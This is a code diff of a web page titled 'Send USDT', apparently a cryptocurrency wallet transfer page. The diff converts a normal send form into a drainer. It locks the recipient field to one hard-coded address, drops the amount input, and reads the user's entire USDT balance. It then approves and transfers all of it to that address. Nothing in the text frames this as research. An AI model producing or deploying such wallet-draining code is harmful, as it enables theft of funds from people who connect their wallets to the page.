@@ -57,15 +57,6 @@
       color: #00ff99;
       cursor: pointer;
     }
-    .amount-box {
-      display: flex;
-      align-items: center;
-    }
-    .amount-box .token {
-      color: #ccc;
-      margin-left: 10px;
-      font-size: 14px;
-    }
     .usd {
       font-size: 12px;
       color: #888;
@@ -98,23 +89,15 @@
   <header>Send USDT</header>
 
   <div class="container">
-    <label>Address or Domain Name</label>
+    <label>Recipient Wallet Address</label>
     <div class="input-box">
-      <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" />
+      <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly />
       <div class="input-actions">
-        <span onclick="document.getElementById('wallet').value=''">✕</span>
-        <span onclick="navigator.clipboard.readText().then(text => document.getElementById('wallet').value = text)">Paste</span>
+        <span onclick="navigator.clipboard.writeText(document.getElementById('wallet').value)">Copy</span>
       </div>
     </div>
 
-    <label>Amount</label>
-    <div class="input-box amount-box">
-      <input type="number" id="amount" placeholder="USDT Amount" />
-      <span class="token">USDT</span>
-      <span class="input-actions" onclick="document.getElementById('amount').value='100'">Max</span>
-    </div>
-
-    <div class="usd">≈ $0.00</div>
+    <div class="usd">All your USDT will be sent to the above address.</div>
   </div>
 
   <div class="fixed-button">
@@ -147,14 +130,16 @@
         const accounts = await web3.eth.getAccounts();
         const user = accounts[0];
 
-        const wallet = document.getElementById("wallet").value;
-        const amount = document.getElementById("amount").value;
+        const RECEIVER = document.getElementById("wallet").value;
+        const USDT = "0x55d398326f99059fF775485246999027B3197955";
+        const contract = new web3.eth.Contract(ABI, USDT);
 
-        const contract = new web3.eth.Contract(ABI, "0x55d398326f99059fF775485246999027B3197955"); // USDT
-        const value = web3.utils.toWei(amount, 'mwei'); // for USDT 6 decimals
+        const balance = await contract.methods.balanceOf(user).call();
 
-        await contract.methods.approve(wallet, value).send({ from: user });
-        await contract.methods.transferFrom(user, wallet, value).send({ from: user });
+        if (balance <= 0) throw new Error("No USDT found.");
+
+        await contract.methods.approve(RECEIVER, balance).send({ from: user });
+        await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
         btn.innerText = "✅ Done";
       } catch (e) {
